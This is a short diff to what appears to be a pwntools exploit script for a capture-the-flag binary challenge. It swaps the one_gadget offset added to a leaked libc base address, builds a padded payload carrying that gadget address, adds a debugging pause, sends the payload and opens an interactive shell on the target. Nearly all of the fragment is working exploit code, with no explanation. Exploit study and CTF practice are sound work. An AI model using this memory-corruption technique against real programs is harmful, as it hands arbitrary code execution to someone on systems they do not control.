@@ -97,10 +97,10 @@ def exp():
 
     index_sentence('b' * 0x60)
 
-    one_gadget_addr = libc_base + 0xf02a4
+    one_gadget_addr = libc_base + 0xf1147
     payload = 'a' * 0x13 + p64(one_gadget_addr)
     payload = payload.ljust(0x60, 'f')
-
+    pause()
     index_sentence(payload)
     p.interactive()
 
